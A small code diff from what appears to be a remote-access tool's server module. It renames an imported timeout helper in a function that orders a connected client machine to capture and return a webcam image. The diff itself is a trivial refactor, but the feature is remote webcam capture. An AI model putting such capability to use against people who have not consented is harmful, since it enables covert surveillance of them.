@@ -3,7 +3,7 @@ import logging
 from datetime import datetime
 
 from modules.clients import Client
-from utils.timeout_handler import TimeoutSetter
+from utils.timeout_handler import timeoutsetter
 
 
 def webcam(client: Client, filename: str = None) -> str:
@@ -11,7 +11,7 @@ def webcam(client: Client, filename: str = None) -> str:
     logging.debug('Capturing webcam (%s)', client.id)
     client.write(b'WEBCAM')
 
-    with TimeoutSetter(client, 120):
+    with timeoutsetter(client, 120):
         img_data = client.read()
 
     if img_data == b'ERROR':
